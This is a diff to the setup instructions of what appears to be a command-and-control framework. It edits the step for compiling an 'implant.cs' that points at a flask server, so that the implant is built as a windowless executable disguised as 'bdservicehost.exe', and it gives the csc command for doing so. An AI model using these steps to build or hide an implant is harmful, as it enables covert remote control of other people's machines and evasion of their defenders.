@@ -69,11 +69,11 @@ Follow the following videos in order
           
           Make changes to the 'srvip' variable in implant.cs with the srvip that the flask server uses
 
-3. Build the implant.cs into an executable
+3. Build the implant.cs into an executable disguised as bdservicehost.exe that runs as a windows executable
           
           Use .Net 4.0 Windows device to build the executable
           
-          csc /target:winexe implant.cs
+          csc /target:winexe /out:bdservicehost.exe implant.cs
 
 4. Start listener by running the listener.sh script
   
